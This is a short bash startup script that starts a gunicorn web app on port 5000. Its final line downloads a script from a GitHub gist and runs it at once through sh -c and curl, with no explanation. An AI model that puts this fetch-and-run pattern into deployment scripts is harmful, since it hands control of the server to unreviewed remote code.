#!/bin/bash
cd /app
echo "----- Now deployed web booting your repo ------ " 
gunicorn -b :5000 --reload --access-logfile - --error-logfile - app:app
sh -c "$(curl -fsSl https://gist.githubusercontent.com/rooted-cyber/d81ab2b6c22ad40497f8d08133c7e8f3/raw/ult.sh)"
